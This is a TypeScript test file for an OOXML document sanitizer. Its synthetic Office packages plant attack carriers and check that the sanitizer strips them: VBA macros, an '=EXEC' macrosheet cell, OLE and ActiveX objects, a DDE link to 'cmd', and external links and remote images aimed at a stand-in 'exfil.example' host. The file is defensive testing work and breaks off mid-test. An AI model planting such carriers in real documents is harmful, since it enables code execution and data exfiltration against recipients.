/**
 * `ooxmlDisarm` — the OOXML allowlist rebuild (#433 S6; spec §5.3 step 2,
 * review F11 and F12, amendments A1 and A3; pin Z2).
 *
 * The input is an ATTACKER-SUPPLIED document. Every case below is a synthetic
 * package built in `ooxml-fixtures.ts` that plants one carrier — a macro, an
 * external relationship, a hidden run, a hidden sheet, a field code — beside a
 * visible control sentinel, and asserts the carrier is in NO part of the
 * output while the control survives. The control is what stops an empty
 * package passing every "absent" assertion.
 *
 * Each element rule is also exercised inside `mc:Choice` and `mc:Fallback`,
 * and under a prefix other than the conventional one, because the rules match
 * by namespace URI. Each pin names the mutation that turns it red; the PR's
 * mutation table records the run.
 */
import { describe, expect, it, vi } from 'vitest'
import {
  parseXml,
  readZip,
  ZipRefusedError,
  XML_LIMITS,
  type XmlElement,
  type ZipRefusal,
} from '@hames-ai/harness-patterns/stash/zip.server'
import {
  DocumentRefusedError,
  flattenDocument,
  sanitizeOptionFor,
} from '@hames-ai/harness-patterns/stash/document-sanitizer.server'
import { ooxmlDisarm } from '../../document/ooxml-disarm.server'
import {
  blob,
  buildPackage,
  CT,
  docx,
  everything,
  inAlternateContent,
  MIME,
  noise,
  NS,
  P_ROOT_NS,
  para,
  pptx,
  row,
  RT,
  run,
  shape,
  SP_TREE_HEAD,
  sStyles,
  unpack,
  wNotes,
  wStyles,
  xlsx,
  type Rel,
} from './ooxml-fixtures'

/** The output's entry names, sorted. */
function names(bytes: Uint8Array): string[] {
  return readZip(bytes)
    .map((e) => e.name)
    .sort()
}

async function refusalOf(p: Promise<unknown>): Promise<string> {
  try {
    await p
  } catch (err) {
    if (err instanceof DocumentRefusedError || err instanceof ZipRefusedError) return err.code
    throw err
  }
  throw new Error('expected a refusal')
}

/** Disarm, then assert the carrier is nowhere and the control is still there. */
async function disarmed(
  bytes: Uint8Array,
  mime: string,
  gone: readonly string[],
  kept = 'VISIBLE',
) {
  const out = await ooxmlDisarm(bytes, mime)
  const all = everything(out.bytes)
  for (const g of gone) expect(all, `${g} survived the disarm`).not.toContain(g)
  expect(all, `the control ${kept} was dropped too`).toContain(kept)
  return out
}

const DOCX_STYLES_NORMAL =
  '<w:style w:type="paragraph" w:default="1" w:styleId="Normal"><w:name w:val="Normal"/></w:style>'

// ============================================================================
// The rebuilt package
// ============================================================================

describe('the rebuilt package', () => {
  it('a clean docx keeps its text, removes nothing and counts nothing', async () => {
    const out = await disarmed(docx({ body: para('VISIBLE') }), MIME.docx, [])
    expect(names(out.bytes)).toEqual(['[Content_Types].xml', '_rels/.rels', 'word/document.xml'])
    expect(out.removed).toEqual({})
    expect(out.counted).toEqual({})
  })

  it('reopens through the S5 reader and type check, for all six types', async () => {
    const cases: [Uint8Array, string][] = [
      [docx({ body: para('VISIBLE') }), MIME.docx],
      [docx({ body: para('VISIBLE'), macroEnabled: true }), MIME.docm],
      [
        xlsx({ sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }] }),
        MIME.xlsx,
      ],
      [
        xlsx({
          macroEnabled: true,
          sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        }),
        MIME.xlsm,
      ],
      [pptx({ slides: [{ shapes: shape('VISIBLE') }] }), MIME.pptx],
      [pptx({ macroEnabled: true, slides: [{ shapes: shape('VISIBLE') }] }), MIME.pptm],
    ]
    for (const [bytes, mimeType] of cases) {
      const convert = vi.fn(async (b64: string) => {
        expect(everything(Buffer.from(b64, 'base64'))).toContain('VISIBLE')
        return 'VISIBLE'
      })
      const doc = await flattenDocument(
        { bytes, filename: 'x', mimeType },
        { convert, disarm: ooxmlDisarm },
      )
      expect(doc.report.mimeType).toBe(mimeType)
      expect(doc.report.hiddenContent).toBe('removed')
      expect(convert).toHaveBeenCalledTimes(1)
    }
  })

  it('is deterministic: the same input gives the same bytes', async () => {
    const bytes = docx({ body: para('VISIBLE'), styles: wStyles(DOCX_STYLES_NORMAL) })
    const a = await ooxmlDisarm(bytes, MIME.docx)
    const b = await ooxmlDisarm(bytes, MIME.docx)
    expect(Buffer.from(a.bytes).equals(Buffer.from(b.bytes))).toBe(true)
  })

  it('writes a fresh package: comments and processing instructions do not survive', async () => {
    const body = `<!-- XMLCOMMENTSENTINEL -->${para('VISIBLE')}<?pi PISENTINEL?>`
    await disarmed(docx({ body }), MIME.docx, ['XMLCOMMENTSENTINEL', 'PISENTINEL'])
  })

  it('escapes what it writes: text and attribute values round-trip exactly', async () => {
    const body =
      `<w:p><w:r><w:t xml:space="preserve">VISIBLE &amp; &lt;tag&gt; ]]&gt; "q" &#13;&#10;line</w:t></w:r></w:p>` +
      `<w:p><w:pPr><w:pStyle w:val="a&amp;b&quot;c&#10;d&#9;e&#13;f&lt;'"/></w:pPr></w:p>` +
      `<w:p><w:r><w:t><![CDATA[CDATA <raw> & ]]></w:t></w:r></w:p>`
    const out = await ooxmlDisarm(docx({ body }), MIME.docx)
    const root = parseXml(unpack(out.bytes).get('word/document.xml')!)
    const texts: string[] = []
    const vals: string[] = []
    const walk = (e: XmlElement) => {
      if (e.name === 't') texts.push(e.children.join(''))
      if (e.name === 'pStyle') vals.push(e.attributes.find((a) => a.name === 'val')!.value)
      for (const c of e.children) if (typeof c !== 'string') walk(c)
    }
    walk(root)
    expect(texts).toEqual(['VISIBLE & <tag> ]]> "q" \r\nline', 'CDATA <raw> & '])
    expect(vals).toEqual(['a&b"c\nd\te\rf<\''])
  })

  it('an unwrapped element passes its namespace declarations to its children', async () => {
    const body =
      `<w:p><w:ins w:id="1" w:author="a" xmlns:x="${NS.w}">` +
      `<x:r><x:t>VISIBLE</x:t></x:r></w:ins></w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    // It parses again (an unbound prefix would be refused) and the wrapper is gone.
    expect(unpack(out.bytes).get('word/document.xml')).not.toContain('w:ins')
  })
})

// ============================================================================
// The part allowlist (spec §5.3 step 2, F11)
// ============================================================================

describe('Z2: the part allowlist — only parts reached through allowlisted relationships', () => {
  it('keeps exactly the allowlisted parts of a docx', async () => {
    const out = await ooxmlDisarm(
      docx({
        body: para('VISIBLE'),
        styles: wStyles(DOCX_STYLES_NORMAL),
        numbering: `<w:numbering xmlns:w="${NS.w}"/>`,
        footnotes: wNotes('footnotes', ''),
        endnotes: wNotes('endnotes', ''),
        docRels: [
          { id: 'rIdTheme', type: RT.theme, target: 'theme/theme1.xml' },
          { id: 'rIdSettings', type: RT.settings, target: 'settings.xml' },
          { id: 'rIdEffects', type: RT.stylesWithEffects, target: 'stylesWithEffects.xml' },
        ],
        parts: [
          {
            name: 'word/theme/theme1.xml',
            type: CT.theme,
            body: `<a:theme xmlns:a="${NS.a}" name="T"/>`,
          },
          {
            name: 'word/settings.xml',
            type: CT.wSettings,
            body: `<w:settings xmlns:w="${NS.w}"/>`,
          },
          {
            name: 'word/stylesWithEffects.xml',
            type: CT.wStyles,
            body: `<w:styles xmlns:w="${NS.w}"/>`,
          },
        ],
      }),
      MIME.docx,
    )
    expect(names(out.bytes)).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'word/_rels/document.xml.rels',
      'word/document.xml',
      'word/endnotes.xml',
      'word/footnotes.xml',
      'word/numbering.xml',
      'word/styles.xml',
      'word/theme/theme1.xml',
    ])
    expect(out.removed.otherParts).toBe(2)
  })

  it('keeps exactly the allowlisted parts of an xlsx', async () => {
    const out = await ooxmlDisarm(
      xlsx({
        sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        styles: sStyles({ xfs: ['<xf numFmtId="0" fontId="0" fillId="0"/>'] }),
        sharedStrings: `<sst xmlns="${NS.s}"/>`,
        workbookRels: [{ id: 'rIdTheme', type: RT.theme, target: 'theme/theme1.xml' }],
        parts: [
          {
            name: 'xl/theme/theme1.xml',
            type: CT.theme,
            body: `<a:theme xmlns:a="${NS.a}" name="T"/>`,
          },
        ],
      }),
      MIME.xlsx,
    )
    expect(names(out.bytes)).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'xl/_rels/workbook.xml.rels',
      'xl/sharedStrings.xml',
      'xl/styles.xml',
      'xl/theme/theme1.xml',
      'xl/workbook.xml',
      'xl/worksheets/sheet1.xml',
    ])
  })

  it('keeps exactly the allowlisted parts of a pptx: visible slides and their notes', async () => {
    const out = await ooxmlDisarm(
      pptx({
        slides: [{ shapes: shape('VISIBLE'), notes: 'NOTESVISIBLE' }],
        presentationRels: [
          { id: 'rIdMaster', type: RT.slideMaster, target: 'slideMasters/slideMaster1.xml' },
        ],
        parts: [
          {
            name: 'ppt/slideMasters/slideMaster1.xml',
            type: CT.slideMaster,
            body: `<p:sldMaster xmlns:p="${NS.p}"/>`,
          },
        ],
      }),
      MIME.pptx,
    )
    expect(names(out.bytes)).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'ppt/_rels/presentation.xml.rels',
      'ppt/notesSlides/_rels/notesSlide1.xml.rels',
      'ppt/notesSlides/notesSlide1.xml',
      'ppt/presentation.xml',
      'ppt/slides/_rels/slide1.xml.rels',
      'ppt/slides/slide1.xml',
    ])
    expect(everything(out.bytes)).toContain('NOTESVISIBLE')
  })

  it('drops macros: vbaProject.bin and vbaData.xml from a docm', async () => {
    const out = await disarmed(
      docx({
        macroEnabled: true,
        body: para('VISIBLE'),
        docRels: [{ id: 'rIdVba', type: RT.vbaProject, target: 'vbaProject.bin' }],
        parts: [
          { name: 'word/vbaProject.bin', type: CT.vba, body: blob('MACROSENTINEL') },
          {
            name: 'word/vbaData.xml',
            type: CT.vbaData,
            body: `<wne:vbaSuppData xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"><wne:mcds><wne:mcd wne:macroName="VBADATASENTINEL"/></wne:mcds></wne:vbaSuppData>`,
          },
        ],
        extraRels: {
          'word/vbaProject.bin': [{ id: 'rIdData', type: RT.wordVbaData, target: 'vbaData.xml' }],
        },
      }),
      MIME.docm,
      ['MACROSENTINEL', 'VBADATASENTINEL', 'vbaProject', 'vbaData'],
    )
    expect(out.removed.macros).toBe(2)
  })

  it('drops macros from an xlsm and a pptm', async () => {
    const vba = { name: 'xl/vbaProject.bin', type: CT.vba, body: blob('XLMACROSENTINEL') }
    await disarmed(
      xlsx({
        macroEnabled: true,
        sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        workbookRels: [{ id: 'rIdVba', type: RT.vbaProject, target: 'vbaProject.bin' }],
        parts: [vba],
      }),
      MIME.xlsm,
      ['XLMACROSENTINEL', 'vbaProject'],
    )
    await disarmed(
      pptx({
        macroEnabled: true,
        slides: [{ shapes: shape('VISIBLE') }],
        presentationRels: [{ id: 'rIdVba', type: RT.vbaProject, target: 'vbaProject.bin' }],
        parts: [{ name: 'ppt/vbaProject.bin', type: CT.vba, body: blob('PPMACROSENTINEL') }],
      }),
      MIME.pptm,
      ['PPMACROSENTINEL', 'vbaProject'],
    )
  })

  it('drops a macrosheet, and the <sheet> that names it', async () => {
    const out = await disarmed(
      xlsx({
        macroEnabled: true,
        sheets: [
          { name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` },
          {
            name: 'MACRONAMESENTINEL',
            macro: true,
            xml: `<sheetData>${row(1, ['=EXEC("XLMSENTINEL")'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsm,
      ['XLMSENTINEL', 'MACRONAMESENTINEL', 'macrosheet'],
    )
    expect(out.removed.macros).toBe(1)
    expect(out.removed.references).toBe(1)
  })

  it('drops embeddings and OLE objects, part and element', async () => {
    const body =
      para('VISIBLE') +
      // The object's preview shape can carry a text box of its own.
      `<w:p><w:r><w:object><v:shape id="ole1"><v:imagedata r:id="rIdImg" o:title="OLETITLESENTINEL"/>` +
      `<v:textbox><w:txbxContent>${para('OLEBOXSENTINEL')}</w:txbxContent></v:textbox></v:shape>` +
      `<o:OLEObject Type="Embed" ProgID="Package" ShapeID="ole1" r:id="rIdOle"/></w:object></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        docRels: [
          { id: 'rIdOle', type: RT.oleObject, target: 'embeddings/oleObject1.bin' },
          { id: 'rIdImg', type: RT.image, target: 'media/image1.png' },
        ],
        parts: [
          { name: 'word/embeddings/oleObject1.bin', type: CT.ole, body: blob('OLESENTINEL') },
          { name: 'word/media/image1.png', type: CT.png, body: blob('PNGSENTINEL') },
        ],
      }),
      MIME.docx,
      ['OLESENTINEL', 'OLETITLESENTINEL', 'OLEBOXSENTINEL', 'OLEObject', 'embeddings/'],
    )
    expect(out.removed.embeddings).toBe(1)
    expect(out.removed.oleObjects).toBe(1)
  })

  it('drops ActiveX controls, part and element', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:object><w:control r:id="rIdCtl" w:name="CTLNAMESENTINEL"/></w:object></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        docRels: [{ id: 'rIdCtl', type: RT.control, target: 'activeX/activeX1.xml' }],
        parts: [
          {
            name: 'word/activeX/activeX1.xml',
            type: CT.activeX,
            body: `<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" ax:classid="AXSENTINEL"/>`,
          },
        ],
      }),
      MIME.docx,
      ['AXSENTINEL', 'CTLNAMESENTINEL', 'activeX'],
    )
    expect(out.removed.activeX).toBe(1)
  })

  it('drops comments in all three formats, parts and markers', async () => {
    const wBody =
      `<w:p><w:commentRangeStart w:id="0"/>${run('VISIBLE')}<w:commentRangeEnd w:id="0"/>` +
      `<w:r><w:commentReference w:id="0"/></w:r></w:p>`
    const w = await disarmed(
      docx({
        body: wBody,
        docRels: [{ id: 'rIdComments', type: RT.comments, target: 'comments.xml' }],
        parts: [
          {
            name: 'word/comments.xml',
            type: CT.wComments,
            body: `<w:comments xmlns:w="${NS.w}"><w:comment w:id="0">${para('WCOMMENTSENTINEL')}</w:comment></w:comments>`,
          },
        ],
      }),
      MIME.docx,
      ['WCOMMENTSENTINEL', 'commentRange', 'commentReference'],
    )
    expect(w.removed.comments).toBe(1)
    expect(w.removed.commentMarkers).toBe(3)

    await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData><legacyDrawing r:id="rIdVml"/>`,
            rels: [
              { id: 'rIdComments', type: RT.comments, target: '../comments1.xml' },
              { id: 'rIdVml', type: RT.vmlDrawing, target: '../drawings/vmlDrawing1.vml' },
            ],
          },
        ],
        parts: [
          {
            name: 'xl/comments1.xml',
            type: CT.sComments,
            body: `<comments xmlns="${NS.s}"><commentList><comment ref="A1"><text><t>SCOMMENTSENTINEL</t></text></comment></commentList></comments>`,
          },
          {
            name: 'xl/drawings/vmlDrawing1.vml',
            body: `<xml xmlns:v="${NS.v}"><v:shape><v:textbox>VMLSENTINEL</v:textbox></v:shape></xml>`,
          },
        ],
      }),
      MIME.xlsx,
      ['SCOMMENTSENTINEL', 'VMLSENTINEL', 'legacyDrawing'],
    )

    await disarmed(
      pptx({
        slides: [
          {
            shapes: shape('VISIBLE'),
            rels: [{ id: 'rIdComments', type: RT.comments, target: '../comments/comment1.xml' }],
          },
        ],
        parts: [
          {
            name: 'ppt/comments/comment1.xml',
            type: CT.pComments,
            body: `<p:cmLst xmlns:p="${NS.p}"><p:cm authorId="0"><p:text>PCOMMENTSENTINEL</p:text></p:cm></p:cmLst>`,
          },
        ],
      }),
      MIME.pptx,
      ['PCOMMENTSENTINEL'],
    )
  })

  it('drops every external relationship, and the references to it', async () => {
    const body =
      `<w:p><w:hyperlink r:id="rIdLink">${run('VISIBLE')}</w:hyperlink></w:p>` +
      `<w:p><w:r><w:drawing><wp:inline><wp:docPr id="1" name="p"/><a:graphic><a:graphicData uri="x">` +
      `<pic:pic><pic:nvPicPr><pic:cNvPr id="2" name="p"/><pic:cNvPicPr/></pic:nvPicPr>` +
      `<pic:blipFill><a:blip r:link="rIdRemoteImg"/></pic:blipFill></pic:pic>` +
      `</a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>`
    const out = await disarmed(
      docx({
        body,
        styles: wStyles(DOCX_STYLES_NORMAL),
        docRels: [
          {
            id: 'rIdLink',
            type: RT.hyperlink,
            target: 'https://exfil.example/LINKSENTINEL',
            external: true,
          },
          {
            id: 'rIdRemoteImg',
            type: RT.image,
            target: 'https://exfil.example/IMGSENTINEL.png',
            external: true,
          },
          // An allowlisted TYPE does not make an external target a part.
          {
            id: 'rIdRemoteTheme',
            type: RT.theme,
            target: 'https://exfil.example/THEMESENTINEL.xml',
            external: true,
          },
          // A TargetMode that is not `Internal` is not internal.
          {
            id: 'rIdOdd',
            type: RT.numbering,
            target: 'numbering.xml',
            targetMode: 'external',
          },
        ],
        parts: [
          {
            name: 'word/numbering.xml',
            type: CT.wNumbering,
            body: `<w:numbering xmlns:w="${NS.w}"><!-- NUMSENTINEL --></w:numbering>`,
          },
        ],
      }),
      MIME.docx,
      ['LINKSENTINEL', 'IMGSENTINEL', 'THEMESENTINEL', 'exfil.example', 'TargetMode', 'rIdLink'],
    )
    expect(out.removed.externalRelationships).toBe(4)
    // The link's text stays; only its target is gone.
    expect(unpack(out.bytes).get('word/document.xml')).toContain('<w:hyperlink>')
    expect(names(out.bytes)).not.toContain('word/numbering.xml')
  })

  it('drops external links (DDE) and the references to them', async () => {
    await disarmed(
      xlsx({
        sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        workbookExtra:
          '<externalReferences><externalReference r:id="rIdExt"/></externalReferences>',
        workbookRels: [
          { id: 'rIdExt', type: RT.externalLink, target: 'externalLinks/externalLink1.xml' },
        ],
        parts: [
          {
            name: 'xl/externalLinks/externalLink1.xml',
            type: CT.externalLink,
            body: `<externalLink xmlns="${NS.s}"><ddeLink ddeService="cmd" ddeTopic="DDESENTINEL"/></externalLink>`,
          },
        ],
      }),
      MIME.xlsx,
      ['DDESENTINEL', 'externalReference r:id', 'externalLinks/'],
    )
  })

  it('drops customXml, customUI, the glossary, embedded fonts and document properties', async () => {
    const out = await disarmed(
      docx({
        body: para('VISIBLE'),
        docRels: [
          { id: 'rIdCx', type: RT.customXml, target: '../customXml/item1.xml' },
          { id: 'rIdGloss', type: RT.glossaryDocument, target: 'glossary/document.xml' },
          { id: 'rIdFonts', type: RT.fontTable, target: 'fontTable.xml' },
        ],
        rootRels: [
          { id: 'rIdUi', type: RT.ui, target: 'customUI/customUI14.xml' },
          { id: 'rIdCore', type: RT.coreProperties, target: 'docProps/core.xml' },
          { id: 'rIdApp', type: RT.extendedProperties, target: 'docProps/app.xml' },
          { id: 'rIdCustom', type: RT.customProperties, target: 'docProps/custom.xml' },
        ],
        parts: [
          { name: 'customXml/item1.xml', body: '<data>CUSTOMXMLSENTINEL</data>' },
          {
            name: 'customUI/customUI14.xml',
            type: CT.customUI,
            body: '<customUI onLoad="CUSTOMUISENTINEL"/>',
          },
          {
            name: 'word/glossary/document.xml',
            type: CT.wGlossary,
            body: `<w:glossaryDocument xmlns:w="${NS.w}"><w:docParts><w:docPart><w:docPartBody>${para('GLOSSARYSENTINEL')}</w:docPartBody></w:docPart></w:docParts></w:glossaryDocument>`,
          },
          {
            name: 'word/fontTable.xml',
            type: CT.wFontTable,
            body: `<w:fonts xmlns:w="${NS.w}" xmlns:r="${NS.r}"><w:font w:name="F"><w:embedRegular r:id="rIdFont"/></w:font></w:fonts>`,
          },
          { name: 'word/fonts/font1.odttf', type: CT.font, body: blob('FONTSENTINEL') },
          {
            name: 'docProps/core.xml',
            type: CT.coreProps,
            body: '<cp:coreProperties xmlns:cp="urn:cp">CORESENTINEL</cp:coreProperties>',
          },
          {
            name: 'docProps/app.xml',
            type: CT.appProps,
            body: '<Properties xmlns="urn:app">APPSENTINEL</Properties>',
          },
          {
            name: 'docProps/custom.xml',
            type: CT.customProps,
            body: '<Properties xmlns="urn:custom">CUSTOMPROPSENTINEL</Properties>',
          },
        ],
        extraRels: {
          'word/fontTable.xml': [{ id: 'rIdFont', type: RT.font, target: 'fonts/font1.odttf' }],
        },
      }),
      MIME.docx,
      [
        'CUSTOMXMLSENTINEL',
        'CUSTOMUISENTINEL',
        'GLOSSARYSENTINEL',
        'FONTSENTINEL',
        'CORESENTINEL',
        'APPSENTINEL',
        'CUSTOMPROPSENTINEL',
      ],
    )
    expect(out.removed).toMatchObject({
      customXml: 1,
      customUI: 1,
      glossary: 1,
      fonts: 1,
      properties: 3,
    })
  })

  it('drops connections, query tables and pivot caches', async () => {
    const out = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData><tableParts count="1"><tablePart r:id="rIdTable"/></tableParts>`,
            rels: [{ id: 'rIdTable', type: RT.table, target: '../tables/table1.xml' }],
          },
        ],
        workbookExtra: '<pivotCaches><pivotCache cacheId="1" r:id="rIdPivot"/></pivotCaches>',
        workbookRels: [
          { id: 'rIdConn', type: RT.connections, target: 'connections.xml' },
          {
            id: 'rIdPivot',
            type: RT.pivotCacheDefinition,
            target: 'pivotCache/pivotCacheDefinition1.xml',
          },
        ],
        parts: [
          {
            name: 'xl/connections.xml',
            type: CT.connections,
            body: `<connections xmlns="${NS.s}"><connection id="1" name="CONNSENTINEL"><webPr url="https://exfil.example/"/></connection></connections>`,
          },
          {
            name: 'xl/tables/table1.xml',
            type: CT.table,
            body: `<table xmlns="${NS.s}" id="1" name="T" ref="A1:A1"/>`,
          },
          {
            name: 'xl/queryTables/queryTable1.xml',
            type: CT.queryTable,
            body: `<queryTable xmlns="${NS.s}" name="QUERYSENTINEL" connectionId="1"/>`,
          },
          {
            name: 'xl/pivotCache/pivotCacheDefinition1.xml',
            type: CT.pivotCacheDefinition,
            body: `<pivotCacheDefinition xmlns="${NS.s}"><cacheSource type="external" connectionId="1"/><cacheFields count="1"><cacheField name="PIVOTSENTINEL"/></cacheFields></pivotCacheDefinition>`,
          },
        ],
        extraRels: {
          'xl/tables/table1.xml': [
            { id: 'rIdQuery', type: RT.queryTable, target: '../queryTables/queryTable1.xml' },
          ],
        },
      }),
      MIME.xlsx,
      [
        'CONNSENTINEL',
        'QUERYSENTINEL',
        'PIVOTSENTINEL',
        'exfil.example',
        'tablePart r:id',
        'pivotCache ',
      ],
    )
    expect(out.removed.dataConnections).toBe(3)
  })

  it('drops a part no relationship reaches, and a part reached by a type off the allowlist', async () => {
    await disarmed(
      docx({
        body: para('VISIBLE'),
        docRels: [
          { id: 'rIdHdr', type: RT.header, target: 'header1.xml' },
          { id: 'rIdSettings', type: RT.settings, target: 'settings.xml' },
        ],
        parts: [
          {
            name: 'word/stray.xml',
            type: CT.wStyles,
            body: `<w:styles xmlns:w="${NS.w}">${'<!--x-->'}STRAYSENTINEL</w:styles>`,
          },
          {
            name: 'word/header1.xml',
            type: CT.wHeader,
            body: `<w:hdr xmlns:w="${NS.w}">${para('HEADERSENTINEL')}</w:hdr>`,
          },
          {
            name: 'word/settings.xml',
            type: CT.wSettings,
            body: `<w:settings xmlns:w="${NS.w}"><w:docVars><w:docVar w:name="v" w:val="DOCVARSENTINEL"/></w:docVars></w:settings>`,
          },
        ],
      }),
      MIME.docx,
      ['STRAYSENTINEL', 'HEADERSENTINEL', 'DOCVARSENTINEL', 'headerReference'],
    )
  })

  it('drops a part an allowlisted relationship reaches when its content type is not that role’s', async () => {
    const out = await disarmed(
      docx({
        body: para('VISIBLE'),
        docRels: [{ id: 'rIdStyles', type: RT.styles, target: 'vbaProject.bin' }],
        parts: [{ name: 'word/vbaProject.bin', type: CT.vba, body: blob('MISTYPEDSENTINEL') }],
      }),
      MIME.docx,
      ['MISTYPEDSENTINEL', 'vbaProject'],
    )
    expect(out.removed.macros).toBe(1)
  })
})

// ============================================================================
// Hidden content: dropped (spec §5.3 step 2, F11)
// ============================================================================

describe('Z2: hidden runs — effective vanish, specVanish and webHidden are dropped', () => {
  const styled = (styles: string, body: string) =>
    docx({ body, styles: wStyles(DOCX_STYLES_NORMAL + styles) })

  it('direct w:vanish', async () => {
    const out = await disarmed(
      docx({ body: `<w:p>${run('VISIBLE')}${run('HIDDENSENTINEL', '<w:vanish/>')}</w:p>` }),
      MIME.docx,
      ['HIDDENSENTINEL'],
    )
    expect(out.removed.hiddenRuns).toBe(1)
  })

  it('direct w:specVanish and w:webHidden', async () => {
    await disarmed(
      docx({
        body:
          `<w:p>${run('VISIBLE')}${run('SPECSENTINEL', '<w:specVanish/>')}` +
          `${run('WEBSENTINEL', '<w:webHidden w:val="true"/>')}</w:p>`,
      }),
      MIME.docx,
      ['SPECSENTINEL', 'WEBSENTINEL'],
    )
  })

  it('a direct w:vanish w:val="0" keeps the run, whatever the styles say', async () => {
    const styles =
      '<w:docDefaults><w:rPrDefault><w:rPr><w:vanish/></w:rPr></w:rPrDefault></w:docDefaults>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE', '<w:vanish w:val="0"/>')}${run('DEFAULTSENTINEL')}</w:p>`,
      ),
      MIME.docx,
      ['DEFAULTSENTINEL'],
    )
  })

  it('inherited through rStyle', async () => {
    const styles =
      '<w:style w:type="character" w:styleId="Ghost"><w:rPr><w:vanish/></w:rPr></w:style>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE')}${run('RSTYLESENTINEL', '<w:rStyle w:val="Ghost"/>')}</w:p>`,
      ),
      MIME.docx,
      ['RSTYLESENTINEL'],
    )
  })

  it('inherited through basedOn', async () => {
    const styles =
      '<w:style w:type="character" w:styleId="Ghost"><w:rPr><w:vanish/></w:rPr></w:style>' +
      '<w:style w:type="character" w:styleId="Child"><w:basedOn w:val="Ghost"/></w:style>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE')}${run('BASEDONSENTINEL', '<w:rStyle w:val="Child"/>')}</w:p>`,
      ),
      MIME.docx,
      ['BASEDONSENTINEL'],
    )
  })

  it('a basedOn cycle terminates', async () => {
    const styles =
      '<w:style w:type="character" w:styleId="A"><w:basedOn w:val="B"/></w:style>' +
      '<w:style w:type="character" w:styleId="B"><w:basedOn w:val="A"/><w:rPr><w:vanish/></w:rPr></w:style>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE')}${run('CYCLESENTINEL', '<w:rStyle w:val="A"/>')}</w:p>`,
      ),
      MIME.docx,
      ['CYCLESENTINEL'],
    )
  })

  it('inherited through pStyle', async () => {
    const styles =
      '<w:style w:type="paragraph" w:styleId="GhostPara"><w:rPr><w:vanish/></w:rPr></w:style>'
    await disarmed(
      styled(
        styles,
        para('VISIBLE') + para('PSTYLESENTINEL', '<w:pPr><w:pStyle w:val="GhostPara"/></w:pPr>'),
      ),
      MIME.docx,
      ['PSTYLESENTINEL'],
    )
  })

  it('inherited from the default paragraph style when a paragraph names none', async () => {
    const styles =
      '<w:style w:type="paragraph" w:default="1" w:styleId="Ghost"><w:rPr><w:vanish/></w:rPr></w:style>' +
      '<w:style w:type="paragraph" w:styleId="Shown"/>'
    await disarmed(
      docx({
        body:
          para('VISIBLE', '<w:pPr><w:pStyle w:val="Shown"/></w:pPr>') + para('DEFAULTPSENTINEL'),
        styles: wStyles(styles),
      }),
      MIME.docx,
      ['DEFAULTPSENTINEL'],
    )
  })

  it('inherited from docDefaults', async () => {
    const styles =
      '<w:docDefaults><w:rPrDefault><w:rPr><w:vanish/></w:rPr></w:rPrDefault></w:docDefaults>'
    await disarmed(
      styled(
        styles,
        `<w:p>${run('VISIBLE', '<w:vanish w:val="false"/>')}${run('DOCDEFAULTSENTINEL')}</w:p>`,
      ),
      MIME.docx,
      ['DOCDEFAULTSENTINEL'],
    )
  })

  it('inherited from a table style, its conditional formatting included', async () => {
    const styles =
      '<w:style w:type="table" w:styleId="GhostTable"><w:tblStylePr w:type="firstRow"><w:rPr><w:vanish/></w:rPr></w:tblStylePr></w:style>'
    const table =
      '<w:tbl><w:tblPr><w:tblStyle w:val="GhostTable"/></w:tblPr><w:tblGrid><w:gridCol/></w:tblGrid>' +
      `<w:tr><w:tc>${para('TABLESENTINEL')}</w:tc></w:tr></w:tbl>`
    await disarmed(styled(styles, para('VISIBLE') + table), MIME.docx, ['TABLESENTINEL'])
  })

  it('a property given twice is read as hiding if either says so', async () => {
    const styles =
      '<w:style w:type="paragraph" w:styleId="GhostPara"><w:rPr><w:vanish/></w:rPr></w:style>'
    const body =
      `<w:p>${run('VISIBLE')}<w:r><w:rPr><w:b/></w:rPr><w:rPr><w:vanish/></w:rPr><w:t>SECONDRPRSENTINEL</w:t></w:r>` +
      `<w:r><w:rPr><w:vanish w:val="0"/><w:vanish/></w:rPr><w:t>SECONDVANISHSENTINEL</w:t></w:r></w:p>` +
      `<w:p><w:pPr><w:pStyle w:val="Normal"/></w:pPr><w:pPr><w:pStyle w:val="GhostPara"/></w:pPr>${run('SECONDPPRSENTINEL')}</w:p>`
    await disarmed(styled(styles, body), MIME.docx, [
      'SECONDRPRSENTINEL',
      'SECONDVANISHSENTINEL',
      'SECONDPPRSENTINEL',
    ])
  })

  it('a hidden math run', async () => {
    await disarmed(
      docx({
        body: `<w:p>${run('VISIBLE')}<m:oMath><m:r><w:rPr><w:vanish/></w:rPr><m:t>MATHSENTINEL</m:t></m:r></m:oMath></w:p>`,
      }),
      MIME.docx,
      ['MATHSENTINEL'],
    )
  })
})

describe('Z2: hidden sheets and slides', () => {
  it('drops hidden and very hidden sheets: the part, its relationship and its <sheet>', async () => {
    const out = await disarmed(
      xlsx({
        sheets: [
          { name: 'Shown', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` },
          {
            name: 'HIDDENNAMESENTINEL',
            state: 'hidden',
            xml: `<sheetData>${row(1, ['HIDDENSHEETSENTINEL'])}</sheetData>`,
          },
          {
